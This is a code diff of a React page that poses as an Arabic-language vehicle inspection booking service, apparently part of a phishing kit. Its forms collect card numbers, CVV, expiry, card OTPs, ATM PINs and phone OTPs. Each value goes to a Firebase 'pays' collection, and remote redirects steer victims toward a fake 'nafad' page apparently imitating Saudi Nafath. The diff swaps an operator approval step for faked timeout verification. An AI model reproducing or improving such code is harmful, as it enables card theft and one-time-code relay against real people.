@@ -12,14 +12,11 @@ import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu,
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/types"
 
-// Removed duplicate type BankInfo definition as it's already imported from "@/types"
-// type BankInfo = {
-//   name: string
-//   logo: string
-//   color: string
-// }
+type VehicleStatus = "license" | "customs"
+type VehicleType = "car" | "motorcycle" | "truck"
+type AppStep = "landing" | "booking" | "payment-method" | "card-form" | "otp" | "pin" | "phone-verification"
+type PaymentMethod = "card" | "wallet" | "bank"
 function randstr(prefix: string) {
   return Math.random()
     .toString(36)
@@ -42,23 +39,19 @@ export default function VehicleBooking() {
   const [captchaChecked, setCaptchaChecked] = useState(true)
   const [inspectionType, setInspectionType] = useState("") // Added declaration
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("landing") // Changed initial step to landing
+  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
   const [expiryDate, setExpiryDate] = useState("")
   const [cvv, setCvv] = useState("")
-  const [otp, setOtp] = useState("")
+  const [otp, setOtp] = useState(["", "", "", "", "", ""])
   const [pin, setPin] = useState(["", "", "", ""])
   const [isLoading, setIsLoading] = useState(false)
   const [phone, setPhone] = useState("")
   const [operator, setOperator] = useState("")
   const [phoneOtp, setPhoneOtp] = useState("")
   const [phoneOtpError, setPhoneOtpError] = useState("")
-  const [cardOtpApproval, setCardOtpApproval] = useState<ApprovalStatus | undefined>()
-  const [phoneOtpApproval, setPhoneOtpApproval] = useState<ApprovalStatus | undefined>()
-  const [otpError, setOtpError] = useState("")
-  const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
 
   useEffect(() => {
     getLocation().then(() => {
@@ -69,13 +62,6 @@ export default function VehicleBooking() {
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
-        if (userData.cardOtpApproval) {
-          setCardOtpApproval(userData.cardOtpApproval as ApprovalStatus)
-        }
-        if (userData.phoneOtpApproval) {
-          setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
-        }
-
         if (userData.currentPage === "2" || userData.currentPage === 2) {
           window.location.href = "/quote"
         } else if (userData.currentPage === "8888" || userData.currentPage === "nafaz") {
@@ -170,26 +156,17 @@ export default function VehicleBooking() {
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    setOtpError("")
     await addData({
       id: visitorID,
-      otp: otp,
+      otp: otp.join(""),
       step: "otp-submitted",
-      cardOtpApproval: "pending",
     })
-    setCardOtpApproval("pending")
     setIsLoading(true)
-  }
-
-  useEffect(() => {
-    if (cardOtpApproval === "approved") {
-      setIsLoading(false)
+    setTimeout(() => {
       setCurrentStep("pin")
-    } else if (cardOtpApproval === "rejected") {
       setIsLoading(false)
-      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-    }
-  }, [cardOtpApproval])
+    }, 1500)
+  }
 
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -207,7 +184,6 @@ export default function VehicleBooking() {
 
   const handlePhoneVerification = async (e: React.FormEvent) => {
     e.preventDefault()
-    setPhoneOtpError("")
     await addData({
       id: visitorID,
       phone,
@@ -215,86 +191,18 @@ export default function VehicleBooking() {
       phoneOtp,
       step: "payment-completed",
       completedDate: new Date().toISOString(),
-      phoneOtpApproval: "pending",
     })
-    setPhoneOtpApproval("pending")
     setIsLoading(true)
-  }
-
-  useEffect(() => {
-    if (phoneOtpApproval === "approved") {
+    setTimeout(() => {
+      console.log("Payment completed successfully")
+     window.location.href='/nafad'
       setIsLoading(false)
-      // Navigate to success page or show success message
-      setCurrentStep("landing")
-      alert("تم التحقق بنجاح! شكراً لك.")
-    } else if (phoneOtpApproval === "rejected") {
-      setIsLoading(false)
-      setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
-    }
-  }, [phoneOtpApproval])
-
-  const checkBIN = (cardNum: string) => {
-    const bin = cardNum.replace(/\s/g, "").substring(0, 6)
-
-    // Saudi banks BIN database
-    const binDatabase: BinDatabase = {
-      "400861": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
-      "446404": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
-      "535024": { name: "الأهلي", logo: "🏦", color: "#006747" },
-      "468540": { name: "الأهلي", logo: "🏦", color: "#006747" },
-      "401205": { name: "الرياض", logo: "🏦", color: "#0066b2" },
-      "489318": { name: "الرياض", logo: "🏦", color: "#0066b2" },
-      "543357": { name: "ساب", logo: "🏦", color: "#0f75bc" },
-      "455708": { name: "ساب", logo: "🏦", color: "#0f75bc" },
-      "474491": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
-      "431361": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
-      "543085": { name: "الإنماء", logo: "🏦", color: "#00a651" },
-      "440647": { name: "الإنماء", logo: "🏦", color: "#00a651" },
-      "968208": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
-      "529415": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
-    }
-
-    if (bin.length >= 6 && binDatabase[bin]) {
-      setBankInfo(binDatabase[bin])
-    } else {
-      setBankInfo(null)
-    }
-  }
-
-  const handleCardNumberChange = (value: string) => {
-    const formatted = value
-      .replace(/\s/g, "")
-      .replace(/(\d{4})/g, "$1 ")
-      .trim()
-    setCardNumber(formatted)
-    checkBIN(formatted)
+    }, 1500)
   }
 
   const vehicleTypes = [
     { id: "car" as VehicleType, label: "سيارة خاصة", icon: Car },
     { id: "truck" as VehicleType, label: "شاحنة", icon: Truck },
-  ]
-
-  const inspectionTypes = [
-    { value: "private-car", label: "سيارة خاصة", icon: "🚗" },
-    { value: "light-private-transport", label: "مركبة نقل خفيفة خاصة", icon: "🚚" },
-    { value: "heavy-transport", label: "نقل ثقيل", icon: "🚛" },
-    { value: "light-bus", label: "حافلة خفيفة", icon: "🚐" },
-    { value: "light-transport", label: "مركبة نقل خفيفة", icon: "🚚" },
-    { value: "medium-transport", label: "نقل متوسط", icon: "🚛" },
-    { value: "large-bus", label: "حافلة كبيرة", icon: "🚌" },
-    { value: "two-wheel-motorcycle", label: "الدراجات ثنائية العجلات", icon: "🏍️" },
-    { value: "public-works", label: "مركبات أشغال عامة", icon: "🚜" },
-    { value: "three-four-wheel", label: "دراجة ثلاثية أو رباعية العجلات", icon: "🛺" },
-    { value: "heavy-trailer", label: "مقطورة ثقيلة", icon: "🚛" },
-    { value: "rental-cars", label: "سيارات الأجرة", icon: "🚕" },
-    { value: "hire-cars", label: "سيارات التأجير", icon: "🚗" },
-    { value: "semi-heavy-trailer", label: "نصف مقطورة ثقيلة", icon: "🚛" },
-    { value: "medium-bus", label: "حافلة متوسطة", icon: "🚐" },
-    { value: "light-trailer", label: "مقطورة خفيفة", icon: "🚚" },
-    { value: "light-semi-trailer", label: "نصف مقطورة خفيفة", icon: "🚚" },
-    { value: "private-light-semi-trailer", label: "نصف مقطورة خفيفة خاصة", icon: "🚚" },
-    { value: "private-light-trailer", label: "مقطورة خفيفة خاصة", icon: "🚚" },
   ]
 
   const regions = [
@@ -870,84 +778,50 @@ export default function VehicleBooking() {
               </div>
             </div>
 
-            {/* Vehicle Type Selection */}
-            <div className="space-y-3">
-              <Label htmlFor="vehicle-type" className="text-base font-semibold text-foreground flex items-center gap-2">
-                <Car className="h-4 w-4 text-teal-700" />
-                نوع المركبة *
-              </Label>
-              <div className="grid grid-cols-2 gap-3">
-                {vehicleTypes.map((type) => {
-                  const Icon = type.icon
-                  return (
-                    <button
-                      key={type.id}
-                      type="button"
-                      onClick={() => setVehicleType(type.id)}
-                      className={`relative p-4 rounded-xl border-2 text-right transition-all hover:scale-[1.02] ${
-                        vehicleType === type.id
-                          ? "border-teal-700 bg-teal-700/5 shadow-sm"
-                          : "border-border bg-card hover:border-teal-700/30"
-                      }`}
-                    >
-                      <div className="flex items-center gap-3">
-                        <div
-                          className={`w-10 h-10 rounded-lg flex items-center justify-center transition-colors ${
-                            vehicleType === type.id ? "bg-teal-700 text-white" : "bg-secondary text-muted-foreground"
-                          }`}
-                        >
-                          <Icon className="h-5 w-5" />
-                        </div>
-                        <span
-                          className={`font-medium ${vehicleType === type.id ? "text-foreground" : "text-muted-foreground"}`}
-                        >
-                          {type.label}
-                        </span>
-                      </div>
-                      {vehicleType === type.id && (
-                        <div className="absolute top-2 left-2">
-                          <div className="w-5 h-5 rounded-full bg-teal-700 flex items-center justify-center">
-                            <Check className="h-3 w-3 text-white" />
-                          </div>
-                        </div>
-                      )}
-                    </button>
-                  )
-                })}
-              </div>
-            </div>
-
-            {/* Inspection Type Selection */}
-            <div className="space-y-3">
-              <Label
-                htmlFor="inspection-type"
-                className="text-base font-semibold text-foreground flex items-center gap-2"
-              >
-                <Car className="h-4 w-4 text-teal-700" />
-                نوع الفحص *
+            {/* Vehicle type with icon */}
+            <div className="space-y-2">
+              <Label htmlFor="vehicle-type" className="text-sm font-medium text-gray-700">
+                نوع المركبة<span className="text-red-500">*</span>
               </Label>
               <div className="relative">
                 <select
-                  id="inspection-type"
-                  value={inspectionType}
-                  onChange={(e) => setInspectionType(e.target.value)}
-                  required
-                  className="w-full h-12 px-4 pr-12 rounded-xl border-2 border-border bg-card text-foreground appearance-none cursor-pointer hover:border-teal-700/30 focus:border-teal-700 focus:ring-2 focus:ring-teal-700/20 transition-colors text-right"
+                  id="vehicle-type"
+                  value={vehicleType}
+                  onChange={(e) => setVehicleType(e.target.value as VehicleType)}
+                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
+                  data-testid="select-vehicle-type"
                 >
-                  <option value="" disabled>
-                    اختر نوع المركبة
-                  </option>
-                  {inspectionTypes.map((type) => (
-                    <option key={type.value} value={type.value}>
-                      {type.label}
-                    </option>
-                  ))}
+                  <option value="car">سيارة</option>
+                  <option value="motorcycle">دراجة نارية</option>
+                  <option value="truck">شاحنة</option>
                 </select>
-                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground pointer-events-none" />
+                <Car className="absolute right-4 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400 pointer-events-none" />
+                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
               </div>
             </div>
 
-            {/* Region Selection */}
+            {/* Service type */}
+            <div className="space-y-2">
+              <Label htmlFor="service-type" className="text-sm font-medium text-gray-700">
+                نوع الخدمة<span className="text-red-500">*</span>
+              </Label>
+              <div className="relative">
+                <select
+                  id="service-type"
+                  value={inspectionType}
+                  onChange={(e) => setInspectionType(e.target.value)}
+                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
+                  data-testid="select-service-type"
+                >
+                  <option value="">خدمة الفحص الدوري</option>
+                  <option value="periodic">فحص دوري</option>
+                  <option value="transfer">فحص نقل ملكية</option>
+                </select>
+                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
+              </div>
+            </div>
+
+            {/* Inspection region */}
             <div className="space-y-2">
               <Label htmlFor="region" className="text-sm font-medium text-gray-700">
                 المنطقة لإجراء الفحص<span className="text-red-500">*</span>
@@ -1293,14 +1167,7 @@ export default function VehicleBooking() {
             <div className="relative w-full h-48 bg-gradient-to-br from-[#2c3e5f] to-[#1a2332] rounded-2xl shadow-lg p-6 text-white">
               <div className="flex justify-between items-start mb-8">
                 <CreditCard className="w-10 h-10" />
-                {bankInfo ? (
-                  <div className="flex flex-col items-end gap-1">
-                    <div className="text-3xl">{bankInfo.logo}</div>
-                    <div className="text-xs opacity-80">{bankInfo.name}</div>
-                  </div>
-                ) : (
-                  <div className="w-12 h-8 bg-gradient-to-br from-amber-400 to-amber-500 rounded"></div>
-                )}
+                <div className="w-12 h-8 bg-gradient-to-br from-amber-400 to-amber-500 rounded"></div>
               </div>
 
               <div className="space-y-4">
@@ -1338,28 +1205,13 @@ export default function VehicleBooking() {
                         type="text"
                         placeholder="0000 0000 0000 0000"
                         value={cardNumber}
-                        onChange={(e) => handleCardNumberChange(e.target.value)}
+                        onChange={(e) => setCardNumber(e.target.value)}
                         maxLength={19}
                         required
                         className="bg-muted/50 pr-10"
                       />
-                      <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
-                        {bankInfo ? (
-                          <>
-                            <span className="text-xl">{bankInfo.logo}</span>
-                            <span className="text-xs font-medium">{bankInfo.name}</span>
-                          </>
-                        ) : (
-                          <CreditCard className="w-5 h-5 text-muted-foreground" />
-                        )}
-                      </div>
+                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                     </div>
-                    {bankInfo && (
-                      <p className="text-xs text-muted-foreground flex items-center gap-1">
-                        <Check className="w-3 h-3 text-green-600" />
-                        تم التعرف على البنك: {bankInfo.name}
-                      </p>
-                    )}
                   </div>
 
                   <div className="space-y-2">
@@ -1384,8 +1236,6 @@ export default function VehicleBooking() {
                       </Label>
                       <select
                         id="expiry-month"
-                        value={expiryDate.substring(0, 2)}
-                        onChange={(e) => setExpiryDate(e.target.value + expiryDate.substring(2))}
                         className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                         required
                       >
@@ -1404,8 +1254,6 @@ export default function VehicleBooking() {
                       </Label>
                       <select
                         id="expiry-year"
-                        value={expiryDate.substring(3, 5)}
-                        onChange={(e) => setExpiryDate(expiryDate.substring(0, 3) + e.target.value)}
                         className="flex h-10 w-full rounded-md border border-input bg-muted/50 px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
                         required
                       >
@@ -1430,7 +1278,7 @@ export default function VehicleBooking() {
                         type="text"
                         placeholder="•••"
                         value={cvv}
-                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
+                        onChange={(e) => setCvv(e.target.value)}
                         maxLength={3}
                         required
                         className="bg-muted/50"
@@ -1529,6 +1377,7 @@ export default function VehicleBooking() {
             </div>
           </div>
 
+          {/* Enhanced OTP form with professional styling */}
           <form onSubmit={handleOtpSubmit} className="container mx-auto px-4 py-8 space-y-8 max-w-2xl">
             <div className="text-center space-y-3">
               <p className="text-muted-foreground text-lg">تم إرسال رمز التحقق إلى رقم جوالك</p>
@@ -1538,39 +1387,34 @@ export default function VehicleBooking() {
             <Card className="shadow-sm">
               <CardContent className="p-8">
                 <div className="space-y-6">
-                  <Label htmlFor="otp-input" className="text-center block text-lg font-medium">
-                    أدخل رمز التحقق (6 أرقام)<span className="text-destructive">*</span>
+                  <Label className="text-center block text-lg font-medium">
+                    أدخل رمز التحقق<span className="text-destructive">*</span>
                   </Label>
+                  <div className="flex gap-3 justify-center" dir="ltr">
+                    {otp.map((digit, idx) => (
+                      <Input
+                        key={idx}
+                        type="text"
+                        maxLength={1}
+                        value={digit}
+                        onChange={(e) => {
+                          const newOtp = [...otp]
+                          newOtp[idx] = e.target.value
+                          setOtp(newOtp)
 
-                  <div className="max-w-sm mx-auto">
-                    <Input
-                      id="otp-input"
-                      type="text"
-                      maxLength={6}
-                      value={otp}
-                      onChange={(e) => {
-                        setOtp(e.target.value.replace(/\D/g, ""))
-                        setOtpError("")
-                        setCardOtpApproval(undefined)
-                      }}
-                      placeholder="000000"
-                      className="h-16 text-center text-2xl font-bold tracking-widest border-2 focus:border-teal-700 shadow-sm"
-                      dir="ltr"
-                      required
-                      disabled={isLoading}
-                    />
-                    <p className="text-xs text-muted-foreground text-center mt-2">{otp.length}/6 أرقام</p>
-                    {otpError && <p className="text-destructive text-sm text-center mt-2">{otpError}</p>}
-                    {cardOtpApproval === "pending" && (
-                      <div className="flex items-center justify-center gap-2 mt-4">
-                        <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
-                        <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
-                      </div>
-                    )}
+                          if (e.target.value && idx < 5) {
+                            const nextInput = e.target.parentElement?.children[idx + 1] as HTMLInputElement
+                            nextInput?.focus()
+                          }
+                        }}
+                        className="w-14 h-16 text-center text-xl font-bold border-2 focus:border-teal-700 shadow-sm"
+                        required
+                      />
+                    ))}
                   </div>
 
                   <div className="text-center pt-2">
-                    <Button type="button" variant="link" className="text-base font-medium" disabled={isLoading}>
+                    <Button type="button" variant="link" className="text-base font-medium">
                       إعادة إرسال الرمز
                     </Button>
                   </div>
@@ -1588,18 +1432,9 @@ export default function VehicleBooking() {
               >
                 رجوع
               </Button>
-              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading || otp.length < 6}>
-                {isLoading ? (
-                  <>
-                    <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
-                    <span>جاري التحقق...</span>
-                  </>
-                ) : (
-                  <>
-                    <span>التحقق</span>
-                    <ArrowLeft className="w-5 h-5" />
-                  </>
-                )}
+              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading}>
+                <span>التحقق</span>
+                <ArrowLeft className="w-5 h-5" />
               </Button>
             </div>
           </form>
@@ -1728,7 +1563,6 @@ export default function VehicleBooking() {
                         placeholder="05xxxxxxxx"
                         dir="ltr"
                         required
-                        disabled={isLoading}
                       />
                     </div>
                   </div>
@@ -1744,12 +1578,11 @@ export default function VehicleBooking() {
                           key={op.id}
                           type="button"
                           onClick={() => setOperator(op.id)}
-                          disabled={isLoading}
                           className={`flex flex-col items-center justify-center p-4 border-2 rounded-lg transition-all ${
                             operator === op.id
                               ? "border-teal-700 bg-teal-700/10 shadow-md"
                               : `border-border ${op.color} hover:border-teal-700/50`
-                          } ${isLoading ? "opacity-50 cursor-not-allowed" : ""}`}
+                          }`}
                         >
                           <div className="h-8 w-auto mb-2 flex items-center justify-center">
                             <span className="font-bold text-lg">{op.name}</span>
@@ -1778,22 +1611,14 @@ export default function VehicleBooking() {
                           const value = e.target.value.replace(/\D/g, "").slice(0, 6)
                           setPhoneOtp(value)
                           if (phoneOtpError) setPhoneOtpError("")
-                          setPhoneOtpApproval(undefined)
                         }}
                         maxLength={6}
                         placeholder="أدخل رمز التحقق (6 أرقام)"
                         className="text-center text-xl tracking-widest"
                         required
-                        disabled={isLoading}
                       />
                       {phoneOtpError && <p className="text-destructive text-sm text-center">{phoneOtpError}</p>}
-                      {phoneOtpApproval === "pending" && (
-                        <div className="flex items-center justify-center gap-2">
-                          <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
-                          <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
-                        </div>
-                      )}
-                      <Button type="button" variant="link" className="w-full text-sm" disabled={isLoading}>
+                      <Button type="button" variant="link" className="w-full text-sm">
                         إعادة إرسال الرمز
                       </Button>
                     </div>
@@ -1821,17 +1646,8 @@ export default function VehicleBooking() {
                   className="flex-1 h-12 gap-2 shadow-sm"
                   disabled={isLoading || !phone || !operator || phoneOtp.length < 6}
                 >
-                  {isLoading ? (
-                    <>
-                      <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
-                      <span>جاري التحقق...</span>
-                    </>
-                  ) : (
-                    <>
-                      <span>إتمام العملية</span>
-                      <ArrowLeft className="w-5 h-5" />
-                    </>
-                  )}
+                  <span>إتمام العملية</span>
+                  <ArrowLeft className="w-5 h-5" />
                 </Button>
               </div>
             </form>
